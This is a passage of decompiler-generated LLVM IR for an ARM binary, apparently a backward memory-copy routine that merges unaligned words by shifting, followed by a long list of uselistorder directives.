  store i32 %v3_12668, i32* %r3.global-to-local, align 4
  %v4_12668 = add i32 %v0_12668, -8
  %v5_12668 = inttoptr i32 %v4_12668 to i32*
  %v6_12668 = load i32, i32* %v5_12668, align 4
  store i32 %v6_12668, i32* %r4.global-to-local, align 4
  %v7_12668 = add i32 %v0_12668, -12
  %v8_12668 = inttoptr i32 %v7_12668 to i32*
  %v9_12668 = load i32, i32* %v8_12668, align 4
  store i32 %v9_12668, i32* %r5.global-to-local, align 4
  %v10_12668 = add i32 %v0_12668, -16
  %v11_12668 = inttoptr i32 %v10_12668 to i32*
  %v12_12668 = load i32, i32* %v11_12668, align 4
  store i32 %v10_12668, i32* %r1.global-to-local, align 4
  %v4_1266c = udiv i32 %v12_12668, 16777216
  %v5_1266c = or i32 %v4_1266c, %v3_12664
  store i32 %v5_1266c, i32* %lr.global-to-local, align 4
  %v3_12670 = mul i32 %v12_12668, 256
  %v4_12674 = udiv i32 %v9_12668, 16777216
  %v5_12674 = or i32 %v3_12670, %v4_12674
  store i32 %v5_12674, i32* @ip, align 4
  %v3_12678 = mul i32 %v9_12668, 256
  %v4_1267c = udiv i32 %v6_12668, 16777216
  %v5_1267c = or i32 %v3_12678, %v4_1267c
  store i32 %v5_1267c, i32* %r5.global-to-local, align 4
  %v3_12680 = mul i32 %v6_12668, 256
  %v4_12684 = udiv i32 %v3_12668, 16777216
  %v5_12684 = or i32 %v3_12680, %v4_12684
  store i32 %v5_12684, i32* %r4.global-to-local, align 4
  %v1_12688 = add i32 %v0_12688, -16
  %v2_12688 = inttoptr i32 %v1_12688 to i32*
  store i32 %v5_12684, i32* %v2_12688, align 4
  %v4_12688 = add i32 %v0_12688, -12
  %v5_12688 = inttoptr i32 %v4_12688 to i32*
  %v6_12688 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_12688, i32* %v5_12688, align 4
  %v7_12688 = add i32 %v0_12688, -8
  %v8_12688 = inttoptr i32 %v7_12688 to i32*
  %v9_12688 = load i32, i32* @ip, align 4
  store i32 %v9_12688, i32* %v8_12688, align 4
  %v10_12688 = add i32 %v0_12688, -4
  %v11_12688 = inttoptr i32 %v10_12688 to i32*
  %v12_12688 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12688, i32* %v11_12688, align 4
  store i32 %v1_12688, i32* %r0.global-to-local, align 4
  %v0_1268c = load i32, i32* %r2.global-to-local, align 4
  %v2_1268c = add i32 %v0_1268c, -16
  store i32 %v2_1268c, i32* %r2.global-to-local, align 4
  %v6_12690 = icmp slt i32 %v0_1268c, 16
  br i1 %v6_12690, label %dec_label_pc_12694, label %dec_label_pc_12664.dec_label_pc_12664_crit_edge

dec_label_pc_12664.dec_label_pc_12664_crit_edge:  ; preds = %dec_label_pc_12664
  %v0_12664.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_12668.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12664

dec_label_pc_12694:                               ; preds = %dec_label_pc_12664
  %v2_12694 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12694, i32* @r4, align 4
  %v5_12694 = load i8*, i8** %stack_var_-8, align 4
  %v6_12694 = ptrtoint i8* %v5_12694 to i32
  store i32 %v6_12694, i32* @r5, align 4
  store i32 %v11_12660, i32* @lr, align 4
  %v2_12698 = add i32 %v0_1268c, -4
  store i32 %v2_12698, i32* %r2.global-to-local, align 4
  %v4_12698 = add i32 %v0_1268c, 2147483632
  %v5_12698 = and i32 %v2_12698, %v4_12698
  %v6_12698 = icmp slt i32 %v5_12698, 0
  store i1 %v6_12698, i1* %cpsr_v.global-to-local, align 1
  %v7_12698 = icmp slt i32 %v2_12698, 0
  store i1 %v7_12698, i1* %cpsr_n.global-to-local, align 1
  %v5_1269c = icmp slt i32 %v2_1268c, -12
  br i1 %v5_1269c, label %dec_label_pc_126b8, label %dec_label_pc_126a0

dec_label_pc_126a0:                               ; preds = %dec_label_pc_12694, %dec_label_pc_12654, %dec_label_pc_126a0
  %v1_126ac = phi i32 [ %v5_126ac, %dec_label_pc_126a0 ], [ %v1_12688, %dec_label_pc_12694 ], [ %v0_1268831, %dec_label_pc_12654 ]
  %v0_126a0 = load i32, i32* %r3.global-to-local, align 4
  %v3_126a0 = mul i32 %v0_126a0, 256
  store i32 %v3_126a0, i32* %ip.global-to-local, align 4
  %v0_126a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_126a4 = add i32 %v0_126a4, -4
  %v2_126a4 = inttoptr i32 %v1_126a4 to i32*
  %v3_126a4 = load i32, i32* %v2_126a4, align 4
  store i32 %v3_126a4, i32* %r3.global-to-local, align 4
  store i32 %v1_126a4, i32* %r1.global-to-local, align 4
  %v4_126a8 = udiv i32 %v3_126a4, 16777216
  %v5_126a8 = or i32 %v4_126a8, %v3_126a0
  store i32 %v5_126a8, i32* @ip, align 4
  %v2_126ac = add i32 %v1_126ac, -4
  %v3_126ac = inttoptr i32 %v2_126ac to i32*
  store i32 %v5_126a8, i32* %v3_126ac, align 4
  %v4_126ac = load i32, i32* %r0.global-to-local, align 4
  %v5_126ac = add i32 %v4_126ac, -4
  store i32 %v5_126ac, i32* %r0.global-to-local, align 4
  %v0_126b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_126b0 = add i32 %v0_126b0, -4
  store i32 %v2_126b0, i32* %r2.global-to-local, align 4
  %v6_126b4 = icmp slt i32 %v0_126b0, 4
  br i1 %v6_126b4, label %dec_label_pc_126b8.loopexit, label %dec_label_pc_126a0

dec_label_pc_126b8.loopexit:                      ; preds = %dec_label_pc_126a0
  %v4_126b0 = sub i32 3, %v0_126b0
  %v5_126b0 = and i32 %v4_126b0, %v0_126b0
  %v6_126b0 = icmp slt i32 %v5_126b0, 0
  %v7_126b0 = icmp slt i32 %v2_126b0, 0
  store i1 %v6_126b0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_126b0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_126b8

dec_label_pc_126b8:                               ; preds = %dec_label_pc_126b8.loopexit, %dec_label_pc_12694
  %v2_125fc63 = phi i32 [ %v5_126ac, %dec_label_pc_126b8.loopexit ], [ %v1_12688, %dec_label_pc_12694 ]
  %v0_125ec59 = phi i32 [ %v2_126b0, %dec_label_pc_126b8.loopexit ], [ %v2_12698, %dec_label_pc_12694 ]
  %v0_126b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_126b8 = add i32 %v0_126b8, 3
  store i32 %v1_126b8, i32* @r1, align 4
  br label %bb143

dec_label_pc_126c0:                               ; preds = %dec_label_pc_12650
  br i1 %v5_12730, label %dec_label_pc_1270c, label %dec_label_pc_126c8

dec_label_pc_126c8:                               ; preds = %dec_label_pc_126c0
  store i32 %v2_1272c, i32* %r2.global-to-local, align 4
  %v3_126cc = load i32, i32* @r4, align 4
  store i32 %v3_126cc, i32* %stack_var_-12, align 4
  %v6_126cc = load i32, i32* @r5, align 4
  %v8_126cc = inttoptr i32 %v6_126cc to i8*
  store i8* %v8_126cc, i8** %stack_var_-8, align 4
  %v11_126cc = load i32, i32* @lr, align 4
  br label %dec_label_pc_126d0

dec_label_pc_126d0:                               ; preds = %dec_label_pc_126d0.dec_label_pc_126d0_crit_edge, %dec_label_pc_126c8
  %v0_126f4 = phi i32 [ %v1_126f4, %dec_label_pc_126d0.dec_label_pc_126d0_crit_edge ], [ %v0_1268831, %dec_label_pc_126c8 ]
  %v0_126d4 = phi i32 [ %v0_126d4.pre, %dec_label_pc_126d0.dec_label_pc_126d0_crit_edge ], [ %v1_12640, %dec_label_pc_126c8 ]
  %v0_126d0 = phi i32 [ %v0_126d0.pre, %dec_label_pc_126d0.dec_label_pc_126d0_crit_edge ], [ %v2_12644, %dec_label_pc_126c8 ]
  %v3_126d0 = mul i32 %v0_126d0, 65536
  store i32 %v3_126d0, i32* %lr.global-to-local, align 4
  %v1_126d4 = add i32 %v0_126d4, -4
  %v2_126d4 = inttoptr i32 %v1_126d4 to i32*
  %v3_126d4 = load i32, i32* %v2_126d4, align 4
  store i32 %v3_126d4, i32* %r3.global-to-local, align 4
  %v4_126d4 = add i32 %v0_126d4, -8
  %v5_126d4 = inttoptr i32 %v4_126d4 to i32*
  %v6_126d4 = load i32, i32* %v5_126d4, align 4
  store i32 %v6_126d4, i32* %r4.global-to-local, align 4
  %v7_126d4 = add i32 %v0_126d4, -12
  %v8_126d4 = inttoptr i32 %v7_126d4 to i32*
  %v9_126d4 = load i32, i32* %v8_126d4, align 4
  store i32 %v9_126d4, i32* %r5.global-to-local, align 4
  %v10_126d4 = add i32 %v0_126d4, -16
  %v11_126d4 = inttoptr i32 %v10_126d4 to i32*
  %v12_126d4 = load i32, i32* %v11_126d4, align 4
  store i32 %v10_126d4, i32* %r1.global-to-local, align 4
  %v4_126d8 = udiv i32 %v12_126d4, 65536
  %v5_126d8 = or i32 %v4_126d8, %v3_126d0
  store i32 %v5_126d8, i32* %lr.global-to-local, align 4
  %v3_126dc = mul i32 %v12_126d4, 65536
  %v4_126e0 = udiv i32 %v9_126d4, 65536
  %v5_126e0 = or i32 %v3_126dc, %v4_126e0
  store i32 %v5_126e0, i32* @ip, align 4
  %v3_126e4 = mul i32 %v9_126d4, 65536
  %v4_126e8 = udiv i32 %v6_126d4, 65536
  %v5_126e8 = or i32 %v3_126e4, %v4_126e8
  store i32 %v5_126e8, i32* %r5.global-to-local, align 4
  %v3_126ec = mul i32 %v6_126d4, 65536
  %v4_126f0 = udiv i32 %v3_126d4, 65536
  %v5_126f0 = or i32 %v3_126ec, %v4_126f0
  store i32 %v5_126f0, i32* %r4.global-to-local, align 4
  %v1_126f4 = add i32 %v0_126f4, -16
  %v2_126f4 = inttoptr i32 %v1_126f4 to i32*
  store i32 %v5_126f0, i32* %v2_126f4, align 4
  %v4_126f4 = add i32 %v0_126f4, -12
  %v5_126f4 = inttoptr i32 %v4_126f4 to i32*
  %v6_126f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_126f4, i32* %v5_126f4, align 4
  %v7_126f4 = add i32 %v0_126f4, -8
  %v8_126f4 = inttoptr i32 %v7_126f4 to i32*
  %v9_126f4 = load i32, i32* @ip, align 4
  store i32 %v9_126f4, i32* %v8_126f4, align 4
  %v10_126f4 = add i32 %v0_126f4, -4
  %v11_126f4 = inttoptr i32 %v10_126f4 to i32*
  %v12_126f4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_126f4, i32* %v11_126f4, align 4
  store i32 %v1_126f4, i32* %r0.global-to-local, align 4
  %v0_126f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_126f8 = add i32 %v0_126f8, -16
  store i32 %v2_126f8, i32* %r2.global-to-local, align 4
  %v6_126fc = icmp slt i32 %v0_126f8, 16
  br i1 %v6_126fc, label %dec_label_pc_12700, label %dec_label_pc_126d0.dec_label_pc_126d0_crit_edge

dec_label_pc_126d0.dec_label_pc_126d0_crit_edge:  ; preds = %dec_label_pc_126d0
  %v0_126d0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_126d4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_126d0

dec_label_pc_12700:                               ; preds = %dec_label_pc_126d0
  %v2_12700 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12700, i32* @r4, align 4
  %v5_12700 = load i8*, i8** %stack_var_-8, align 4
  %v6_12700 = ptrtoint i8* %v5_12700 to i32
  store i32 %v6_12700, i32* @r5, align 4
  store i32 %v11_126cc, i32* @lr, align 4
  %v2_12704 = add i32 %v0_126f8, -4
  store i32 %v2_12704, i32* %r2.global-to-local, align 4
  %v4_12704 = add i32 %v0_126f8, 2147483632
  %v5_12704 = and i32 %v2_12704, %v4_12704
  %v6_12704 = icmp slt i32 %v5_12704, 0
  store i1 %v6_12704, i1* %cpsr_v.global-to-local, align 1
  %v7_12704 = icmp slt i32 %v2_12704, 0
  store i1 %v7_12704, i1* %cpsr_n.global-to-local, align 1
  %v5_12708 = icmp slt i32 %v2_126f8, -12
  br i1 %v5_12708, label %dec_label_pc_12724, label %dec_label_pc_1270c

dec_label_pc_1270c:                               ; preds = %dec_label_pc_12700, %dec_label_pc_126c0, %dec_label_pc_1270c
  %v1_12718 = phi i32 [ %v5_12718, %dec_label_pc_1270c ], [ %v1_126f4, %dec_label_pc_12700 ], [ %v0_1268831, %dec_label_pc_126c0 ]
  %v0_1270c = load i32, i32* %r3.global-to-local, align 4
  %v3_1270c = mul i32 %v0_1270c, 65536
  store i32 %v3_1270c, i32* %ip.global-to-local, align 4
  %v0_12710 = load i32, i32* %r1.global-to-local, align 4
  %v1_12710 = add i32 %v0_12710, -4
  %v2_12710 = inttoptr i32 %v1_12710 to i32*
  %v3_12710 = load i32, i32* %v2_12710, align 4
  store i32 %v3_12710, i32* %r3.global-to-local, align 4
  store i32 %v1_12710, i32* %r1.global-to-local, align 4
  %v4_12714 = udiv i32 %v3_12710, 65536
  %v5_12714 = or i32 %v4_12714, %v3_1270c
  store i32 %v5_12714, i32* @ip, align 4
  %v2_12718 = add i32 %v1_12718, -4
  %v3_12718 = inttoptr i32 %v2_12718 to i32*
  store i32 %v5_12714, i32* %v3_12718, align 4
  %v4_12718 = load i32, i32* %r0.global-to-local, align 4
  %v5_12718 = add i32 %v4_12718, -4
  store i32 %v5_12718, i32* %r0.global-to-local, align 4
  %v0_1271c = load i32, i32* %r2.global-to-local, align 4
  %v2_1271c = add i32 %v0_1271c, -4
  store i32 %v2_1271c, i32* %r2.global-to-local, align 4
  %v6_12720 = icmp slt i32 %v0_1271c, 4
  br i1 %v6_12720, label %dec_label_pc_12724.loopexit, label %dec_label_pc_1270c

dec_label_pc_12724.loopexit:                      ; preds = %dec_label_pc_1270c
  %v4_1271c = sub i32 3, %v0_1271c
  %v5_1271c = and i32 %v4_1271c, %v0_1271c
  %v6_1271c = icmp slt i32 %v5_1271c, 0
  %v7_1271c = icmp slt i32 %v2_1271c, 0
  store i1 %v6_1271c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1271c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12724

dec_label_pc_12724:                               ; preds = %dec_label_pc_12724.loopexit, %dec_label_pc_12700
  %v2_125fc64 = phi i32 [ %v5_12718, %dec_label_pc_12724.loopexit ], [ %v1_126f4, %dec_label_pc_12700 ]
  %v0_125ec60 = phi i32 [ %v2_1271c, %dec_label_pc_12724.loopexit ], [ %v2_12704, %dec_label_pc_12700 ]
  %v0_12724 = load i32, i32* %r1.global-to-local, align 4
  %v1_12724 = add i32 %v0_12724, 2
  store i32 %v1_12724, i32* @r1, align 4
  br label %bb143

dec_label_pc_1272c:                               ; preds = %dec_label_pc_12640
  br i1 %v5_12730, label %dec_label_pc_12778, label %dec_label_pc_12734

dec_label_pc_12734:                               ; preds = %dec_label_pc_1272c
  store i32 %v2_1272c, i32* %r2.global-to-local, align 4
  %v3_12738 = load i32, i32* @r4, align 4
  store i32 %v3_12738, i32* %stack_var_-12, align 4
  %v6_12738 = load i32, i32* @r5, align 4
  %v8_12738 = inttoptr i32 %v6_12738 to i8*
  store i8* %v8_12738, i8** %stack_var_-8, align 4
  %v11_12738 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1273c

dec_label_pc_1273c:                               ; preds = %dec_label_pc_1273c.dec_label_pc_1273c_crit_edge, %dec_label_pc_12734
  %v0_12760 = phi i32 [ %v1_12760, %dec_label_pc_1273c.dec_label_pc_1273c_crit_edge ], [ %v0_1268831, %dec_label_pc_12734 ]
  %v0_12740 = phi i32 [ %v0_12740.pre, %dec_label_pc_1273c.dec_label_pc_1273c_crit_edge ], [ %v1_12640, %dec_label_pc_12734 ]
  %v0_1273c = phi i32 [ %v0_1273c.pre, %dec_label_pc_1273c.dec_label_pc_1273c_crit_edge ], [ %v2_12644, %dec_label_pc_12734 ]
  %v3_1273c = mul i32 %v0_1273c, 16777216
  store i32 %v3_1273c, i32* %lr.global-to-local, align 4
  %v1_12740 = add i32 %v0_12740, -4
  %v2_12740 = inttoptr i32 %v1_12740 to i32*
  %v3_12740 = load i32, i32* %v2_12740, align 4
  store i32 %v3_12740, i32* %r3.global-to-local, align 4
  %v4_12740 = add i32 %v0_12740, -8
  %v5_12740 = inttoptr i32 %v4_12740 to i32*
  %v6_12740 = load i32, i32* %v5_12740, align 4
  store i32 %v6_12740, i32* %r4.global-to-local, align 4
  %v7_12740 = add i32 %v0_12740, -12
  %v8_12740 = inttoptr i32 %v7_12740 to i32*
  %v9_12740 = load i32, i32* %v8_12740, align 4
  store i32 %v9_12740, i32* %r5.global-to-local, align 4
  %v10_12740 = add i32 %v0_12740, -16
  %v11_12740 = inttoptr i32 %v10_12740 to i32*
  %v12_12740 = load i32, i32* %v11_12740, align 4
  store i32 %v10_12740, i32* %r1.global-to-local, align 4
  %v4_12744 = udiv i32 %v12_12740, 256
  %v5_12744 = or i32 %v4_12744, %v3_1273c
  store i32 %v5_12744, i32* %lr.global-to-local, align 4
  %v3_12748 = mul i32 %v12_12740, 16777216
  %v4_1274c = udiv i32 %v9_12740, 256
  %v5_1274c = or i32 %v3_12748, %v4_1274c
  store i32 %v5_1274c, i32* @ip, align 4
  %v3_12750 = mul i32 %v9_12740, 16777216
  %v4_12754 = udiv i32 %v6_12740, 256
  %v5_12754 = or i32 %v3_12750, %v4_12754
  store i32 %v5_12754, i32* %r5.global-to-local, align 4
  %v3_12758 = mul i32 %v6_12740, 16777216
  %v4_1275c = udiv i32 %v3_12740, 256
  %v5_1275c = or i32 %v3_12758, %v4_1275c
  store i32 %v5_1275c, i32* %r4.global-to-local, align 4
  %v1_12760 = add i32 %v0_12760, -16
  %v2_12760 = inttoptr i32 %v1_12760 to i32*
  store i32 %v5_1275c, i32* %v2_12760, align 4
  %v4_12760 = add i32 %v0_12760, -12
  %v5_12760 = inttoptr i32 %v4_12760 to i32*
  %v6_12760 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_12760, i32* %v5_12760, align 4
  %v7_12760 = add i32 %v0_12760, -8
  %v8_12760 = inttoptr i32 %v7_12760 to i32*
  %v9_12760 = load i32, i32* @ip, align 4
  store i32 %v9_12760, i32* %v8_12760, align 4
  %v10_12760 = add i32 %v0_12760, -4
  %v11_12760 = inttoptr i32 %v10_12760 to i32*
  %v12_12760 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12760, i32* %v11_12760, align 4
  store i32 %v1_12760, i32* %r0.global-to-local, align 4
  %v0_12764 = load i32, i32* %r2.global-to-local, align 4
  %v2_12764 = add i32 %v0_12764, -16
  store i32 %v2_12764, i32* %r2.global-to-local, align 4
  %v6_12768 = icmp slt i32 %v0_12764, 16
  br i1 %v6_12768, label %dec_label_pc_1276c, label %dec_label_pc_1273c.dec_label_pc_1273c_crit_edge

dec_label_pc_1273c.dec_label_pc_1273c_crit_edge:  ; preds = %dec_label_pc_1273c
  %v0_1273c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_12740.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1273c

dec_label_pc_1276c:                               ; preds = %dec_label_pc_1273c
  %v2_1276c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1276c, i32* @r4, align 4
  %v5_1276c = load i8*, i8** %stack_var_-8, align 4
  %v6_1276c = ptrtoint i8* %v5_1276c to i32
  store i32 %v6_1276c, i32* @r5, align 4
  store i32 %v11_12738, i32* @lr, align 4
  %v2_12770 = add i32 %v0_12764, -4
  store i32 %v2_12770, i32* %r2.global-to-local, align 4
  %v4_12770 = add i32 %v0_12764, 2147483632
  %v5_12770 = and i32 %v2_12770, %v4_12770
  %v6_12770 = icmp slt i32 %v5_12770, 0
  store i1 %v6_12770, i1* %cpsr_v.global-to-local, align 1
  %v7_12770 = icmp slt i32 %v2_12770, 0
  store i1 %v7_12770, i1* %cpsr_n.global-to-local, align 1
  %v5_12774 = icmp slt i32 %v2_12764, -12
  br i1 %v5_12774, label %dec_label_pc_12790, label %dec_label_pc_12778

dec_label_pc_12778:                               ; preds = %dec_label_pc_1276c, %dec_label_pc_1272c, %dec_label_pc_12778
  %v1_12784 = phi i32 [ %v5_12784, %dec_label_pc_12778 ], [ %v1_12760, %dec_label_pc_1276c ], [ %v0_1268831, %dec_label_pc_1272c ]
  %v0_12778 = load i32, i32* %r3.global-to-local, align 4
  %v3_12778 = mul i32 %v0_12778, 16777216
  store i32 %v3_12778, i32* %ip.global-to-local, align 4
  %v0_1277c = load i32, i32* %r1.global-to-local, align 4
  %v1_1277c = add i32 %v0_1277c, -4
  %v2_1277c = inttoptr i32 %v1_1277c to i32*
  %v3_1277c = load i32, i32* %v2_1277c, align 4
  store i32 %v3_1277c, i32* %r3.global-to-local, align 4
  store i32 %v1_1277c, i32* %r1.global-to-local, align 4
  %v4_12780 = udiv i32 %v3_1277c, 256
  %v5_12780 = or i32 %v4_12780, %v3_12778
  store i32 %v5_12780, i32* @ip, align 4
  %v2_12784 = add i32 %v1_12784, -4
  %v3_12784 = inttoptr i32 %v2_12784 to i32*
  store i32 %v5_12780, i32* %v3_12784, align 4
  %v4_12784 = load i32, i32* %r0.global-to-local, align 4
  %v5_12784 = add i32 %v4_12784, -4
  store i32 %v5_12784, i32* %r0.global-to-local, align 4
  %v0_12788 = load i32, i32* %r2.global-to-local, align 4
  %v2_12788 = add i32 %v0_12788, -4
  store i32 %v2_12788, i32* %r2.global-to-local, align 4
  %v6_1278c = icmp slt i32 %v0_12788, 4
  br i1 %v6_1278c, label %dec_label_pc_12790.loopexit, label %dec_label_pc_12778

dec_label_pc_12790.loopexit:                      ; preds = %dec_label_pc_12778
  %v4_12788 = sub i32 3, %v0_12788
  %v5_12788 = and i32 %v4_12788, %v0_12788
  %v6_12788 = icmp slt i32 %v5_12788, 0
  %v7_12788 = icmp slt i32 %v2_12788, 0
  store i1 %v6_12788, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12788, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12790

dec_label_pc_12790:                               ; preds = %dec_label_pc_12790.loopexit, %dec_label_pc_1276c
  %v2_125fc65 = phi i32 [ %v5_12784, %dec_label_pc_12790.loopexit ], [ %v1_12760, %dec_label_pc_1276c ]
  %v0_125ec61 = phi i32 [ %v2_12788, %dec_label_pc_12790.loopexit ], [ %v2_12770, %dec_label_pc_1276c ]
  %v0_12790 = load i32, i32* %r1.global-to-local, align 4
  %v1_12790 = add i32 %v0_12790, 1
  store i32 %v1_12790, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_12784, { 0, 2, 1 }
  uselistorder i32 %v3_12778, { 1, 0 }
  uselistorder i32 %v2_12770, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12760, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_12740, { 1, 0 }
  uselistorder i32 %v3_1273c, { 1, 0 }
  uselistorder i32 %v0_12740, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12760, { 3, 2, 1, 0 }
  uselistorder i32 %v5_12718, { 0, 2, 1 }
  uselistorder i32 %v3_1270c, { 1, 0 }
  uselistorder i32 %v2_12704, { 0, 2, 1, 3 }
  uselistorder i32 %v1_126f4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_126d4, { 1, 0 }
  uselistorder i32 %v3_126d0, { 1, 0 }
  uselistorder i32 %v0_126d4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_126f4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_126ac, { 0, 2, 1 }
  uselistorder i32 %v3_126a0, { 1, 0 }
  uselistorder i32 %v2_12698, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12688, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_12668, { 1, 0 }
  uselistorder i32 %v3_12664, { 1, 0 }
  uselistorder i32 %v0_12668, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12688, { 3, 2, 1, 0 }
  uselistorder i1 %v5_12730, { 2, 0, 1 }
  uselistorder i32 %v0_12648, { 1, 0 }
  uselistorder i32 %v0_12734, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1268831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_12638, { 2, 1, 0 }
  uselistorder i32 %v0_12638, { 2, 0, 1 }
  uselistorder i32 %v2_12630, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_12630, { 1, 0, 2 }
  uselistorder i32 %v0_12630, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1268832, { 2, 1, 0 }
  uselistorder i32 %v11_1260c, { 1, 0 }
  uselistorder i32 %v7_1260c, { 1, 0 }
  uselistorder i32 %v1_125ec, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_125ec, { 1, 2, 0, 3 }
  uselistorder i32 %v2_125f0, { 1, 0 }
  uselistorder i32 %v7_125e4, { 0, 2, 1 }
  uselistorder i32 %v10_125e0, { 1, 0 }
  uselistorder i32 %v9_125d8, { 1, 0, 2 }
  uselistorder i32 %v6_125d4, { 1, 0 }
  uselistorder i32 %v2_125cc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_125cc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_125dc, { 0, 3, 2, 1 }
  uselistorder i32 %v7_125c0, { 0, 2, 1 }
  uselistorder i32 %v13_125bc, { 1, 0 }
  uselistorder i32 %v4_125b8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_125b8, { 2, 0, 1 }
  uselistorder i32 %v6_125c0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_125b0, { 0, 2, 1 }
  uselistorder i32 %v16_125ac, { 1, 0 }
  uselistorder i32 %v4_125a8, { 1, 0 }
  uselistorder i32 %v0_125b8.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_125b0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1259c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_12598, { 1, 0 }
  uselistorder i32 %v1_12594, { 1, 0 }
  uselistorder i32 %v10_12590, { 1, 0 }
  uselistorder i32 %v0_12590, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12594, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_12588, { 0, 2, 1 }
  uselistorder i32 %v2_1257c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1257c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_1259449, { 1, 2, 0 }
  uselistorder i32 %v1_12574, { 2, 1, 0 }
  uselistorder i32 %v1_1256c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_12564, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_12560, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_1255c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_1255c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_12548, { 0, 2, 1 }
  uselistorder i32 %v3_1253c, { 1, 0 }
  uselistorder i32 %v2_12534, { 0, 2, 1, 3 }
  uselistorder i32 %v12_12524, { 1, 0, 3, 2 }
  uselistorder i32 %v8_12504, { 1, 0, 2 }
  uselistorder i32 %v5_12504, { 1, 0, 2 }
  uselistorder i32 %v2_12504, { 1, 0, 2 }
  uselistorder i32 %v3_12500, { 1, 0 }
  uselistorder i32 %v0_12504, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12524, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_124dc, { 0, 2, 1 }
  uselistorder i32 %v3_124d0, { 1, 0 }
  uselistorder i32 %v2_124c8, { 0, 2, 1, 3 }
  uselistorder i32 %v12_124b8, { 1, 0, 3, 2 }
  uselistorder i32 %v8_12498, { 1, 0, 2 }
  uselistorder i32 %v5_12498, { 1, 0, 2 }
  uselistorder i32 %v2_12498, { 1, 0, 2 }
  uselistorder i32 %v3_12494, { 1, 0 }
  uselistorder i32 %v0_12498, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_124b8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_12470, { 0, 2, 1 }
  uselistorder i32 %v3_12464, { 1, 0 }
  uselistorder i32 %v2_1245c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_1244c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_1242c, { 1, 0, 2 }
  uselistorder i32 %v5_1242c, { 1, 0, 2 }
  uselistorder i32 %v2_1242c, { 1, 0, 2 }
  uselistorder i32 %v3_12428, { 1, 0 }
  uselistorder i32 %v0_1242c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1244c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_124f4, { 2, 0, 1 }
  uselistorder i32 %v0_124f8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1244c75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_123fc, { 1, 0 }
  uselistorder i32 %v0_123fc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_123f4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_123f4, { 1, 0, 2 }
  uselistorder i32 %v0_123f4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1244c76, { 2, 1, 0 }
  uselistorder i32 %v1_123d4, { 1, 0, 2 }
  uselistorder i32 %v1_123ac, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_123ac, { 1, 2, 0, 3 }
  uselistorder i32 %v8_12398, { 1, 0, 2 }
  uselistorder i32 %v6_12394, { 1, 0 }
  uselistorder i32 %v2_1238c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1238c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1239c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_12384, { 0, 2, 1 }
